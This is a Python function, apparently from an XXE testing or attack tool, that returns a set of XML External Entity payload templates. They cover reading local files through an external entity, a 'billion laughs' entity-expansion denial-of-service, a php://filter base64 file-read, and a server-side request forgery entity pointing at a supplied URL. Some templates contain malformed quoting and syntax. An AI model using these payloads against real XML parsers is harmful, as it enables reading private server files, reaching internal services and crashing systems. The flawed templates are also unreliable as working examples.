def update_templates(entityv, proto, filep, url_lfi, ssrfp):
    return (#
        f"""
            <?xml version="1.0">
            <!DOCTYPE replace [<!ENTITY {entityv} SYSTEM "{proto}://{filep}"> ]>
            <userInfo>
            <firstName>John</firstName>
            <lastName>&{entityv};</lastName>
            </userInfo>
        """,
        """
            <?xml version="1.0" >
            <!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
            <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
            <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
            <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
            <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
            <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
            <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
            <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
            <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
            <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
            ]>
            <tag>&lol9;</tag>
        """,
        f"""
            <?xml version="1.0"?>
            <!DOCTYPE foo [  
            <!ELEMENT foo (#ANY)>
            <!ENTITY {entityv} SYSTEM "{proto}://{filep}">]><foo>&{entityv};</foo>
        """,
        f"""
            <?xml version="1.0"?>
            <!DOCTYPE foo [
            <!ELEMENT foo (#ANY)>
            <!ENTITY %xxe SYSTEM "{proto}://{filep}">
            <!ENTITY {entityv} SYSTEM {url_lfi};">]><foo>&{entityv};</foo>
        """,
        f"""
            <?xml version="1.0"?>
            <!DOCTYPE foo [
            <!ENTITY {entityv} SYSTEM "php://filter/read=convert.base64-encode/resource="{proto}://{filep}">]>
            <foo><result>&{entityv};</result></foo>
        """,
        f"""
            <?xml version="1.0"?>
            <!DOCTYPE foo [  
            <!ELEMENT foo (#ANY)>
            <!ENTITY {entityv} SYSTEM "{ssrfp}">]><foo>&{entityv};</foo>
        """
    )
